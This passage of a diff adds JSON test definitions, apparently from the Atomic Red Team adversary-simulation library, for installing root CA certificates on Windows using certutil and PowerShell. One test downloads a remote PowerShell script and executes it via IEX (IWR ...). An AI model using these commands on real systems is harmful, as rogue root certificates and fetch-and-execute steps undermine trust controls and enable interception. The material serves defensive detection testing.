+                            "cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Install root CA on Windows with certutil",
+                        "auto_generated_guid": "5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f",
+                        "description": "Creates a root CA with certutil\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "pfx_path": {
+                                "description": "Path of the certificate",
+                                "type": "path",
+                                "default": "$env:Temp\\rootCA2.cer"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Certificate must exist at specified location (#{pfx_path})\n",
+                                "prereq_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "certutil -addstore my #{pfx_path}\n",
+                            "cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Add Root Certificate to CurrentUser Certificate Store",
+                        "auto_generated_guid": "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0",
+                        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n",
+                            "cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:10:02"
+}
